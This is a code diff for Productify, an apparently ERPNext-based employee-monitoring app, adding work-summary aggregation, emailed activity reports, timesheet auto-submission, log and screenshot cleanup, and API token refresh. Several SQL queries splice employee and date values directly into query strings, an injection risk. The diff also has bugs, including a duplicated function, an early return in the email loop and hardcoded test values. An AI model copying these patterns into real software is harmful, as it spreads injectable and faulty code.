+        print(PWS.name)
+
+@frappe.whitelist()
+def create_productify_work_summary_today():
+    from frappe.utils import today
+    date = today()
+    employees = frappe.get_all('List of User', fields=['employee'])
+    for i in employees:
+        employee = i['employee']
+        if not frappe.db.exists('Productify Work Summary', {'date': date,'employee':i['employee']}):
+            # print("DOES NOT EXIST")
+            date = date
+            def productify_work_summary(employee,date):
+                print('employee',employee)
+                calls_data = frappe.db.sql(f"""
+                SELECT call_datetime as start, ADDTIME(call_datetime, SEC_TO_TIME(duration)) as end, 'call' as type,  COALESCE(
+                    (SELECT first_name FROM `tabContact` WHERE name = COALESCE(contact, client, customer_no)),
+                    COALESCE(contact, client, customer_no)
+                ) AS caller
+                from `tabEmployee Fincall`
+                where employee = '{employee}' and date = '{date}'
+                """, as_dict=True)
+                # print('calls_data',len(calls_data))
+                internal_meetings_data = frappe.db.sql(f"""
+                SELECT m.meeting_from as start, m.meeting_to as end, 'meeting' as type, m.internal_meeting as meeting_type, Null as party
+                FROM `tabMeeting` as m
+                JOIN `tabMeeting Company Representative` as mcr ON m.name = mcr.parent
+                WHERE mcr.employee = '{employee}' and m.docstatus = 1 and m.meeting_from >= '{date} 00:00:00' and m.meeting_to <= '{date} 23:59:59' and m.internal_meeting = 1
+                """, as_dict=True)
+
+                external_meeting_data = frappe.db.sql(f"""
+                SELECT m.meeting_from as start, m.meeting_to as end, 'meeting' as type, m.party as party,  m.internal_meeting as meeting_type
+                FROM `tabMeeting` as m
+                JOIN `tabMeeting Company Representative` as mcr ON m.name = mcr.parent
+                WHERE mcr.employee = '{employee}' and m.docstatus = 1 and m.meeting_from >= '{date} 00:00:00' and m.meeting_to <= '{date} 23:59:59' and m.internal_meeting = 0
+                """, as_dict=True)                         
+
+                idle_logs = frappe.db.sql(f"""
+                select from_time as start, to_time as end, 'idle' as type
+                from `tabEmployee Idle Time`
+                where employee = '{employee}' and from_time >= '{date} 00:00:00' and to_time <= '{date} 23:59:59'
+                """, as_dict=True)
+                # print("employee",employee)
+                # print("date",date)
+                applications_data = frappe.db.sql(f"""
+                select from_time as start, to_time as end, 'application' as type
+                from `tabApplication Usage log`
+                where employee = '{employee}' and date = '{date}'
+                """, as_dict=True)
+                # print('applications_data',applications_data)
+                data = calls_data + internal_meetings_data + idle_logs + applications_data + external_meeting_data
+                data = sorted(data, key=lambda x: x['start'])
+
+                priority_order = {'call': 3, 'meeting': 2, 'idle': 1, 'application': 0}
+
+                for i in data:
+                    i['priority'] = priority_order[i['type']]
+
+                return data
+            def remove_overlapping(data):
+                i = 0
+                while i < len(data) - 1:
+                    j = i + 1
+                    while j < len(data):
+                        if data[i]['end'] > data[j]['start']:
+                            if data[i]['priority'] > data[j]['priority']:
+                                if data[j]['end'] <= data[i]['end'] and data[j]['start'] >= data[i]['start']:
+                                    data.pop(j)
+                                    continue
+                                else:
+                                    from datetime import datetime, timedelta
+                                    new_start = data[i]['end'] + timedelta(seconds=1)
+                                    data[j]['start'] = new_start
+                                    if j + 1 < len(data) and data[j]['end'] <= data[j + 1]['start']:
+                                        j += 1
+                                    else:
+                                        data.sort(key=lambda x: x['start'])
+                                        i = 0
+                            else:
+                                if data[i]['end'] <= data[j]['end'] and data[i]['start'] >= data[j]['start']:
+                                    data.pop(i)
+                                    break
+                                else:
+                                    from datetime import datetime, timedelta
+                                    new_end = data[j]['start'] - timedelta(seconds=1)
+                                    data[i]['end'] = new_end
+                                    if i > 0 and data[i]['start'] <= data[i - 1]['end']:
+                                        i -= 1
+                                        break
+                        else:
+                            j += 1
+                    i += 1
+                
+                return data
+
+            data = productify_work_summary(employee, date)
+            final_data = remove_overlapping(data)
+            if len(final_data) == 0:
+                continue
+            combined_applications = []
+            current_app = None
+
+            for entry in final_data:
+                if entry['type'] == 'application':
+                    if current_app is None or (entry['start'] - current_app['end']).total_seconds() <= 20:
+                        if current_app is None:
+                            current_app = entry.copy()
+                        else:
+                            current_app['end'] = entry['end']
+                    if (entry['start'] - current_app['end']).total_seconds() <= 20:
+                        current_app['end'] = entry['end']
+                    else:
+                        combined_applications.append(current_app)
+                        current_app = entry.copy()
+                else:
+                    if current_app is not None:
+                        combined_applications.append(current_app)
+                        current_app = None
+            if current_app is not None:
+                combined_applications.append(current_app)
+            PWS = frappe.new_doc('Productify Work Summary')
+            PWS.employee = employee
+            PWS.date = date
+
+            for app_entry in combined_applications:
+                PWS.append('applications', {
+                    'from_time': app_entry['start'],
+                    'to_time': app_entry['end']
+                })
+            PWS.save()
+            # print(PWS.name)
+        else:
+            PWS_DOC = frappe.get_doc('Productify Work Summary',{'date': date,'employee':i['employee']})
+            employee = i['employee']
+            print("else"+ employee)
+            print("else"+ date) 
+            print("else"+ PWS_DOC.name)
+            if PWS_DOC.applications:
+                last_activity = PWS_DOC.applications[-1].to_time
+            else:
+                last_activity = f"{date} 00:00:00"
+            def productify_work_summary(employee,date,last_activity):
+                calls_data = frappe.db.sql(f"""
+                SELECT call_datetime as start, ADDTIME(call_datetime, SEC_TO_TIME(duration)) as end, 'call' as type,  COALESCE(
+                    (SELECT first_name FROM `tabContact` WHERE name = COALESCE(contact, client, customer_no)),
+                    COALESCE(contact, client, customer_no)
+                ) AS caller
+                from `tabEmployee Fincall`
+                where employee = '{employee}' and date = '{date}' and call_datetime >= '{last_activity}'
+                """, as_dict=True)
+                # print('calls_data',len(calls_data))
+                internal_meetings_data = frappe.db.sql(f"""
+                SELECT m.meeting_from as start, m.meeting_to as end, 'meeting' as type, m.internal_meeting as meeting_type, Null as party
+                FROM `tabMeeting` as m
+                JOIN `tabMeeting Company Representative` as mcr ON m.name = mcr.parent
+                WHERE mcr.employee = '{employee}' and m.docstatus = 1 and m.meeting_from >= '{date} 00:00:00' and m.meeting_to <= '{date} 23:59:59' and m.internal_meeting = 1 and m.meeting_from >= '{last_activity}'
+                """, as_dict=True)
+
+                external_meeting_data = frappe.db.sql(f"""
+                SELECT m.meeting_from as start, m.meeting_to as end, 'meeting' as type, m.party as party,  m.internal_meeting as meeting_type
+                FROM `tabMeeting` as m
+                JOIN `tabMeeting Company Representative` as mcr ON m.name = mcr.parent
+                WHERE mcr.employee = '{employee}' and m.docstatus = 1 and m.meeting_from >= '{date} 00:00:00' and m.meeting_to <= '{date} 23:59:59' and m.internal_meeting = 0 and m.meeting_from >= '{last_activity}'
+                """, as_dict=True)                         
+
+                idle_logs = frappe.db.sql(f"""
+                select from_time as start, to_time as end, 'idle' as type
+                from `tabEmployee Idle Time`
+                where employee = '{employee}' and from_time >= '{date} 00:00:00' and to_time <= '{date} 23:59:59' and from_time >= '{last_activity}'
+                """, as_dict=True)
+
+                applications_data = frappe.db.sql(f"""
+                select from_time as start, to_time as end, 'application' as type
+                from `tabApplication Usage log`
+                where employee = '{employee}' and date = '{date}' and from_time >= '{last_activity}'
+                """, as_dict=True)
+                # print('applications_data',applications_data)
+                data = calls_data + internal_meetings_data + idle_logs + applications_data + external_meeting_data
+                data = sorted(data, key=lambda x: x['start'])
+
+                priority_order = {'call': 3, 'meeting': 2, 'idle': 1, 'application': 0}
+
+                for i in data:
+                    i['priority'] = priority_order[i['type']]
+
+                return data
+            def remove_overlapping(data):
+                i = 0
+                while i < len(data) - 1:
+                    j = i + 1
+                    while j < len(data):
+                        if data[i]['end'] > data[j]['start']:
+                            if data[i]['priority'] > data[j]['priority']:
+                                if data[j]['end'] <= data[i]['end'] and data[j]['start'] >= data[i]['start']:
+                                    data.pop(j)
+                                    continue
+                                else:
+                                    from datetime import datetime, timedelta
+                                    new_start = data[i]['end'] + timedelta(seconds=1)
+                                    data[j]['start'] = new_start
+                                    if j + 1 < len(data) and data[j]['end'] <= data[j + 1]['start']:
+                                        j += 1
+                                    else:
+                                        data.sort(key=lambda x: x['start'])
+                                        i = 0
+                            else:
+                                if data[i]['end'] <= data[j]['end'] and data[i]['start'] >= data[j]['start']:
+                                    data.pop(i)
+                                    break
+                                else:
+                                    from datetime import datetime, timedelta
+                                    new_end = data[j]['start'] - timedelta(seconds=1)
+                                    data[i]['end'] = new_end
+                                    if i > 0 and data[i]['start'] <= data[i - 1]['end']:
+                                        i -= 1
+                                        break
+                        else:
+                            j += 1
+                    i += 1
+                
+                return data
+
+            data = productify_work_summary(employee, date, last_activity)
+            final_data = remove_overlapping(data)
+            if len(final_data) == 0:
+                continue
+            combined_applications = []
+            current_app = None
+
+            for entry in final_data:
+                if entry['type'] == 'application':
+                    if current_app is None or (entry['start'] - current_app['end']).total_seconds() <= 20:
+                        if current_app is None:
+                            current_app = entry.copy()
+                        else:
+                            current_app['end'] = entry['end']
+                    if (entry['start'] - current_app['end']).total_seconds() <= 20:
+                        current_app['end'] = entry['end']
+                    else:
+                        combined_applications.append(current_app)
+                        current_app = entry.copy()
+                else:
+                    if current_app is not None:
+                        combined_applications.append(current_app)
+                        current_app = None
+            if current_app is not None:
+                combined_applications.append(current_app)
+            PWS = frappe.get_doc('Productify Work Summary', {'date': date,'employee':i['employee']})
+            for app_entry in combined_applications:
+                PWS.append('applications', {
+                    'from_time': app_entry['start'],
+                    'to_time': app_entry['end']
+                })
+            PWS.save()
+            # print(PWS.name)
+
+
+def get_employee_data(start_date, end_date):
+    userdata = user_analysis_data(start_date, end_date)  # Fetch data with provided dates
+
+    # Debug: Print the structure and content of userdata
+    print("Userdata fetched:", userdata)
+
+    # Initializing the data dictionary
+    data = {
+        "total_hours_per_employee": {},
+        "total_idle_time": {},
+        "employee_fincall_data": {},
+        "meeting_employee_data": {},
+        "total_days": {},
+        "work_intensity_data": {}
+    }
+
+    # Fetching employees with non-empty user_id
+    employees = frappe.get_all("Employee", filters={"name": "HR-EMP-00011"}, fields=["name", "employee_name", "user_id"])
+    
+    # Debug: Print employees fetched
+    print("Employees fetched:", employees)
+
+    for employee in employees:
+        employee_name = employee.employee_name
+        employee_id = employee.name  # Use employee ID instead of user_id
+
+        # Debug: Print current employee details
+        print("Processing employee:", employee_name, "with employee_id:", employee_id)
+
+        # Initialize data structures for the employee
+        data["total_hours_per_employee"][employee_name] = {
+            "total_hours": 0,
+            "active_hours": 0,
+            "idle_hours": 0,
+            "average_active_hours": 0,
+            "incoming_calls": 0,
+            "outgoing_calls": 0,
+            "missed_calls": 0,
+            "rejected_calls": 0,
+            "keystrokes": 0,
+            "mouse_clicks": 0,
+            "scrolls": 0,
+            "meetings": 0,
+            "meeting_duration": 0
+        }
+        data["total_idle_time"][employee_name] = 0
+        data["employee_fincall_data"][employee_name] = {
+            "incoming_fincall_count": 0,
+            "outgoing_fincall_count": 0,
+            "missed_fincall_count": 0,
+            "rejected_fincall_count": 0,
+            "total_incoming_duration": 0,
+            "total_outgoing_duration": 0,
+        }
+        data["meeting_employee_data"][employee_name] = {"count": 0, "duration": 0}
+        data["total_days"][employee_name] = 1
+        data["work_intensity_data"][employee_name] = {
+            "total_keystrokes": 0,
+            "total_mouse_clicks": 0,
+            "total_scroll": 0,
+        }
+
+        # Update data with values from userdata
+        if employee_id in userdata.get("total_hours_per_employee", {}):
+            data["total_hours_per_employee"][employee_name].update({
+                "total_hours": userdata.get("total_hours_per_employee", {}).get(employee_id, 0)
+            })
+
+        if employee_id in userdata.get("total_idle_time", {}):
+            data["total_idle_time"][employee_name] = userdata.get("total_idle_time", {}).get(employee_id, 0)
+
+        if employee_id in userdata.get("employee_fincall_data", {}):
+            data["employee_fincall_data"][employee_name].update(userdata.get("employee_fincall_data", {}).get(employee_id, {}))
+
+        if employee_id in userdata.get("meeting_employee_data", {}):
+            data["meeting_employee_data"][employee_name].update(userdata.get("meeting_employee_data", {}).get(employee_id, {}))
+
+        if employee_id in userdata.get("total_days", {}):
+            data["total_days"][employee_name] = userdata.get("total_days", {}).get(employee_id, 1)
+
+        if employee_id in userdata.get("work_intensity_data", {}):
+            data["work_intensity_data"][employee_name].update(userdata.get("work_intensity_data", {}).get(employee_id, {}))
+
+    return employees, data
+
+
+def generate_html_table(data, employees, start_date, end_date):
+    base_url = frappe.utils.get_url()
+    table_rows = ""
+    count = 1
+
+    for employee in employees:
+        employee_name = employee.employee_name
+        employee_data = data["total_hours_per_employee"].get(employee_name, {})
+
+        employee_url = f"{base_url}/app/Productify Activity Analysis?start_date={start_date}&end_date={end_date}&employee={employee.name}"
+        employee_meeting_url = f"{base_url}/app/meeting?employee={employee.name}&meeting_from=[\"Between\",[\"{start_date}\",\"{end_date}\"]]&docstatus=1"
+        employee_fincall_url = f"{base_url}/app/employee-fincall?employee={employee.name}&date=[\"Between\",[\"{start_date}\",\"{end_date}\"]]"
+        
+        table_rows += f"""
+            <tr>
+                <td align="left">
+                    <a href="{employee_url}" target="_blank">{count}. {employee_name}</a>
+                </td>
+                <td align="center" style="color:#00A6E0;">{format_duration(employee_data.get('total_hours', 0))}</td>
+                <td align="center" style="color:#00A6E0;">{format_duration(employee_data.get('total_hours', 0) - employee_data.get('idle_hours', 0))}</td>
+                <td align="center" style="color:#00A6E0;">{format_duration(employee_data.get('idle_hours', 0))}</td>
+                <td align="center" style="color:#00A6E0;">{format_duration((employee_data.get('total_hours', 0) / data['total_days'][employee_name]) - (employee_data.get('idle_hours', 0) / data['total_days'][employee_name]))}</td>
+                <td align="center"><a href="{employee_fincall_url}&calltype=Incoming" style="color:#62BA46;" target="_blank">{employee_data.get('incoming_calls', 0)} ({format_duration(data['employee_fincall_data'][employee_name].get('total_incoming_duration', 0))} H)</a></td>
+                <td align="center"><a href="{employee_fincall_url}&calltype=Outgoing" style="color:#62BA46;" target="_blank">{employee_data.get('outgoing_calls', 0)} ({format_duration(data['employee_fincall_data'][employee_name].get('total_outgoing_duration', 0))} H)</a></td>
+                <td align="center"><a href="{employee_fincall_url}&calltype=Missed" style="color:#62BA46;" target="_blank">{employee_data.get('missed_calls', 0)}</a></td>
+                <td align="center"><a href="{employee_fincall_url}&calltype=Rejected" style="color:#62BA46;" target="_blank">{employee_data.get('rejected_calls', 0)}</a></td>
+                <td align="center" style="color:#FF4001;">{employee_data.get('keystrokes', 0)}</td>
+                <td align="center" style="color:#FF4001;">{employee_data.get('mouse_clicks', 0)}</td>
+                <td align="center" style="color:#FF4001;">{employee_data.get('scrolls', 0)}</td>
+                <td align="center"><a href="{employee_meeting_url}" style="color:#6420AA;" target="_blank">{employee_data.get('meetings', 0)}</a></td>
+                <td align="center"><a href="{employee_meeting_url}" style="color:#6420AA;" target="_blank">{format_duration(employee_data.get('meeting_duration', 0))}</a></td>
+            </tr>
+        """
+        count += 1
+
+    html_table = f"""
+    <table border="1">
+        <thead>
+            <tr>
+                <th>Employee Name</th>
+                <th>Total Hours</th>
+                <th>Active Hours</th>
+                <th>Idle Hours</th>
+                <th>Average Active Hours</th>
+                <th>Incoming Calls</th>
+                <th>Outgoing Calls</th>
+                <th>Missed Calls</th>
+                <th>Rejected Calls</th>
+                <th>Keystrokes</th>
+                <th>Mouse Clicks</th>
+                <th>Scrolls</th>
+                <th>Meetings</th>
+                <th>Meeting Duration</th>
+            </tr>
+        </thead>
+        <tbody>
+            {table_rows}
+        </tbody>
+    </table>
+    """
+    return html_table
+
+def send_email(user_email, user_name, html_table):
+    try:
+        frappe.sendmail(
+            recipients=[user_email],
+            subject="Weekly Activity Report",
+            message=f"""
+            <p>Dear {user_name},</p>
+            <p>Please find your weekly activity report below:</p>
+            {html_table}
+            """,
+        )
+    except Exception as e:
+        frappe.log_error(f"Failed to send email to {user_email}: {e}", "Email Sending Error")
+
+def send_weekly_report():
+    start_date = "2024-07-10"  # replace with dynamic date logic
+    end_date = "2024-07-10"  # replace with dynamic date logic
+    employees, data = get_employee_data(start_date, end_date)
+    html_table = generate_html_table(data, employees, start_date, end_date)
+               
+    for employee in employees:
+        send_email(employee.user_id, employee.employee_name, html_table)
+        return data
+   
+
+def submit_timesheet_created_by_productify():
+    if not frappe.db.exists("Custom Field", {"fieldname": "is_created_by_productify"}):
+        frappe.throw("Custom Field 'is_created_by_productify' not found")
+    yeasterday = get_datetime() - timedelta(days=1)
+    timesheets = frappe.get_all(
+        "Timesheet",
+        filters={"docstatus": 0, "is_created_by_productify": 1,"creation": (">", yeasterday)},
+        fields=["name"],
+    )
+
+    for timesheet in timesheets:
+        doc = frappe.get_doc("Timesheet", timesheet.name)
+        doc.submit()
+        frappe.db.set_value("Timesheet", doc.name, "docstatus", 1)
+        frappe.db.set_value("Timesheet", doc.name, "status", "Submitted")
+
+
+def submit_timesheet_created_by_productify():
+    if not frappe.db.exists("Custom Field", {"fieldname": "is_created_by_productify"}):
+        frappe.throw("Custom Field 'is_created_by_productify' not found")
+    yeasterday = get_datetime() - timedelta(days=1)
+    timesheets = frappe.get_all(
+        "Timesheet",
+        filters={"docstatus": 0, "is_created_by_productify": 1,"creation": (">", yeasterday)},
+        fields=["name"],
+    )
+    for timesheet in timesheets:
+        doc = frappe.get_doc("Timesheet", timesheet.name)
+        doc.submit()
+        frappe.db.set_value("Timesheet", doc.name, "docstatus", 1)
+        frappe.db.set_value("Timesheet", doc.name, "status", "Submitted")
+
+
+def delete_productify_error_logs():
+    time_for_error_logs = 10
+
+    date_for_error_logs = get_datetime() - timedelta(days=time_for_error_logs)
+
+    frappe.db.sql("""
+        DELETE FROM `tabProductify Error Log`
+        WHERE error_datetime < %s
+    """, (date_for_error_logs.strftime("%Y-%m-%d %H:%M:%S"),))
+
+
+def delete_screenshots():
+    time_for_screenshots = int(frappe.db.get_single_value("Productify Subscription", "keep_screen_shots_for_days")) or 60
+    date_for_screenshots = get_datetime() - timedelta(days=time_for_screenshots)
+    screenshots = frappe.get_all("Screen Screenshot Log", {"time": ("<", date_for_screenshots.strftime("%Y-%m-%d %H:%M:%S"))})
+    for screenshot in screenshots:
+        frappe.delete_doc("Screen Screenshot Log", screenshot.name)
+
+def delete_application_logs():
+    time_for_application_logs = int(frappe.db.get_single_value("Productify Subscription", "keep_application_logs_for_days")) or 60
+    
+    date_for_application_logs = get_datetime() - timedelta(days=time_for_application_logs)
+
+    frappe.db.sql("""
+        DELETE FROM `tabApplication Usage log`
+        WHERE date < %s
+    """, (date_for_application_logs.date(),))
+
+
+def set_challenge():
+    productify_subscription = frappe.get_doc("Productify Subscription")
+    headers = {
+        "Authorization" : f"token {productify_subscription.api_key}:{productify_subscription.get_password('api_secret')}",
+    }
+
+    if not productify_subscription.token_updated_on or get_datetime(productify_subscription.token_updated_on) < get_datetime(nowdate()):
+        response = requests.post(
+            "https://productivity.finbyz.tech/api/method/productivity_backend.api.get_challenge",
+            data={"erpnext_url": productify_subscription.site_url},
+            headers=headers
+        )
+
+        if response.status_code != 200:
+            frappe.log_error(title="Productify Challenge Error", message=f"Failed to get challenge: {response.text}")
+            return
+        
+        data = response.json().get("message")
+        if not data.get("token"):
+            frappe.log_error(title="Productify Challenge Error", message=f"Failed to get challenge: {response.text}")
+            return
+        productify_subscription.token = data.get("token")
+        productify_subscription.token_updated_on = nowdate()
+        productify_subscription.flags.ignore_permissions = True
+        productify_subscription.save()
+        
+        date = get_datetime()
+        for user in productify_subscription.list_of_users:
+            expiration_time = date.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=7)
+            outh_bearer_token_name_call = frappe.db.get_value(
+                "OAuth Bearer Token",
+                filters={"purpose": "productivity_desktop", "user": user.user_id}, fieldname="name"
+            )
+            call_expiration = frappe.db.get_value(
+                "OAuth Bearer Token",
+                filters={"purpose": "productivity_desktop", "user": user.user_id}, fieldname="name"
+            )
+            outh_bearer_token_name_app = frappe.db.get_value(
+                "OAuth Bearer Token",
+                filters={"purpose": "productivity_call_log", "user": user.user_id}, fieldname="name"
+            )
+            app_expiration = frappe.db.get_value(
+                "OAuth Bearer Token",
+                filters={"purpose": "productivity_call_log", "user": user.user_id}, fieldname="name"
+            )
+
+            if outh_bearer_token_name_call and call_expiration != expiration_time:
+                frappe.db.set_value("OAuth Bearer Token", outh_bearer_token_name_call, "expiration_time", expiration_time)
+                frappe.db.set_value("OAuth Bearer Token", outh_bearer_token_name_call, "expires_in", (expiration_time - get_datetime()).total_seconds())
+            if outh_bearer_token_name_app and app_expiration != expiration_time:
+                frappe.db.set_value("OAuth Bearer Token", outh_bearer_token_name_app, "expiration_time", expiration_time)
+                frappe.db.set_value("OAuth Bearer Token", outh_bearer_token_name_app, "expires_in", (expiration_time - get_datetime()).total_seconds())
